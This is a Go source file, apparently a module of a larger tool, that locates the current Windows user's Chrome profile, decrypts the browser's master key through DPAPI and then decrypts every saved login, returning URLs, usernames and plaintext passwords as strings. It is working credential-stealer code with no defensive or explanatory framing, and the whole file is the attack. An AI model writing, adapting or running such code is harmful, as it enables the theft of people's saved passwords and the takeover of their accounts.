package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

type DataBlob struct {
	cbData uint32
	pbData *byte
}

func chrome_main() ([]string, error) {
	var chromeCreds []string
	userProfile := os.Getenv("USERPROFILE")
	loginDataPath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
	localStatePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

	// Read the encryption key
	encryptionKey, err := getEncryptionKey(localStatePath)
	if err != nil {
		fmt.Printf("Error getting encryption key: %v\n", err)
		return nil, err
	}

	// Open the database
	db, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?mode=ro", loginDataPath))
	if err != nil {
		fmt.Printf("Error opening database: %v\n", err)
		return nil, err
	}
	defer db.Close()

	// Query the database
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		fmt.Printf("Error querying database: %v\n", err)
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		err := rows.Scan(&url, &username, &encryptedPassword)
		if err != nil {
			fmt.Printf("Error scanning row: %v\n", err)
			continue
		}

		password, err := decryptPassword(encryptedPassword, encryptionKey)
		if err != nil {
			fmt.Printf("Error decrypting password: %v\n", err)
			continue
		}

		if url == "" || username == "" || password == "" {
			continue
		}

		chromeCreds = append(chromeCreds, fmt.Sprintf("URL:%s: %s: %s", url, username, password))
	}
	return chromeCreds, nil
}

func getEncryptionKey(localStatePath string) ([]byte, error) {
	content, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("error reading Local State file: %v", err)
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(content, &localState); err != nil {
		return nil, fmt.Errorf("error parsing Local State JSON: %v", err)
	}

	encryptedKey, ok := localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("encrypted_key not found in Local State")
	}

	decodedKey, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("error decoding base64 key: %v", err)
	}

	// Remove "DPAPI" prefix
	decodedKey = decodedKey[5:]

	return decryptDPAPI(decodedKey)
}

func decryptDPAPI(data []byte) ([]byte, error) {
	var outBlob DataBlob
	inBlob := DataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	procCryptUnprotectData := windows.NewLazySystemDLL("Crypt32.dll").NewProc("CryptUnprotectData")
	r1, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if r1 == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, unsafe.Slice(outBlob.pbData, outBlob.cbData))

	windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.pbData)))

	return decrypted, nil
}

func decryptPassword(encryptedPassword, key []byte) (string, error) {
	if len(encryptedPassword) < 15 {
		return "", fmt.Errorf("encrypted password is too short")
	}

	// Check if the password is encrypted with AES
	if string(encryptedPassword[:3]) != "v10" {
		// Old method: directly encrypted with DPAPI
		decrypted, err := decryptDPAPI(encryptedPassword)
		return string(decrypted), err
	}

	// New method: AES encrypted
	nonce := encryptedPassword[3:15]
	encryptedPassword = encryptedPassword[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("error creating AES cipher: %v", err)
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("error creating GCM: %v", err)
	}

	plaintext, err := aesgcm.Open(nil, nonce, encryptedPassword, nil)
	if err != nil {
		return "", fmt.Errorf("error decrypting: %v", err)
	}

	return string(plaintext), nil
}
